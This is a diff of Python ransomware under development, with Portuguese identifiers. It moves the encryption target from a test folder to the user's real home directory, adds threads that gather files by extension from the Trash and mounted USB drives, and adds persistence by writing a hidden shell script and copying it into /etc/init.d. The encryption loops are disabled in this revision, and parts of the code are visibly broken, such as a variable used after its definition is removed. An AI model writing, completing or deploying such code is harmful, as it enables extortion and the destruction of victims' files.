@@ -91,19 +91,43 @@ NOVAS COISAS :
 # Starting point of encrypting
 def menu(senha_AES):
     tipos_arquivos = file_types.split(' ')
-    #home = os.environ['HOME'] # /home/user is the start point
-    home = '/home/tarcisio/Desktop/testes/'
-    #t = threading.Thread(target = listar_media, args=(senha_AES, tipos_arquivos))
-    #t.start()
+    home = os.environ['HOME'] # /home/user is the start point
+
+    # # the media
+    t = threading.Thread(target = listar_media, args=(senha_AES, tipos_arquivos))
+    t.start()
+
+    # the trash
+    t2 = threading.Thread(target=list_trash, args = (senha_AES, tipos_arquivos))
+    t2.start()
+
+    # the Home
     listar(senha_AES, home, tipos_arquivos)
-    #listar_media(senha_AES,tipos_arquivos)
-    #while threading.active_count() > 1:
-    #    pass
+
+    while threading.active_count() > 2:
+        pass
+
+def list_trash(senha_AES, tipos_arq):
+    encrypt_list = []
+    caminho = os.path.join(os.path.expanduser('~'), '/.local/share/Trash/files/')
+    if(os.path.isdir(caminho)):
+        for caminho, diret, arq in os.walk(caminho):
+            for elemento in arq:
+                arq = os.path.join(caminho, elemento)
+                extensao = os.path.splitext(arq)
+                for ext in tipos_arq:
+                    if extensao[1] == ext:
+                        encrypt_list.append(arq)
+                        break
+'''
+        for element in encrypt_list: # encrypt happens here
+            criptografa(chave_AES , element)
+'''
 
 # look's for external media such as usb / hd's
 def listar_media(senha_AES, tipos_arq):
     encrypt_list = []
-    #print('Procurando por pendrives/HDs')
+    print('Procurando por pendrives/HDs')
     caminho = '/media/'+getpass.getuser()
     if(os.path.isdir(caminho)):
         for caminho, diret, arq in os.walk(caminho):
@@ -118,10 +142,8 @@ def listar_media(senha_AES, tipos_arq):
 
         '''#cripto routine
         for element in encrypt_list: # encrypt happens here
-            try:
-                criptografa(chave_AES , element)
-            except:
-                print('Error Encrypting file: '+ element)'''
+            criptografa(chave_AES , element)
+            '''
 
 # lists and encrypt files
 def listar(chave_AES,diretorio, tipos_arq):
@@ -155,13 +177,10 @@ def listar(chave_AES,diretorio, tipos_arq):
         encrypt_list.append(e)
 
     #
-
+'''
     for element in encrypt_list: # encrypt happens here
-        try:
-            criptografa(chave_AES , element)
-        except:
-            print('Error Encrypting file: '+ element)
-
+        criptografa(chave_AES , element)
+'''
 
 
 # Generate random AES key for each infection
@@ -198,22 +217,31 @@ def crypto_all():
 '''
 
 def persistence():
-    def generate_sh(): # still working around how to make a sh file
-        f = open('persistence.sh','wb')
+    def generate_script():
         script = '''
-        ''' # it should be an encoded base64
+            # script will be here base64encoded
+        '''
+    def generate_sh(): # still working around how to make a sh file
+        f = open('.persistence.sh','wb')
+        script = '''
+        #!/bin/bash
+        cd /tmp/
+        python script.py
+        '''
         f.write(script)
+        f.close()
         # it should have -> daemon wating for new files / change wallpaper /
 
     generate_sh()
 
-    file_name = 'persistence.sh'
+
     TEMPDIR = tempfile.gettempdir()
-    subprocess.Popen('cp ' + file_name + ' ' + TEMPDIR, shell=True
-                                                      , stdin=subprocess.PIPE
-                                                      , stdout=subprocess.PIPE
-                                                      , stderr=subprocess.PIPE)
-    os.system('chmod +x persistence_arq.sh')
+    os.system('chmod +x .persistence.sh')
+    subprocess.Popen('mv .persistence.sh ' + TEMPDIR, shell=True
+                                                    , stdin=subprocess.PIPE
+                                                    , stdout=subprocess.PIPE
+                                                    , stderr=subprocess.PIPE)
+
     subprocess.Popen('cp ' + os.path.join(TEMPDIR, file_name) + ' /etc/init.d/arq.sh', shell=True
                                                                                      , stdin=subprocess.PIPE
                                                                                      , stdout=subprocess.PIPE
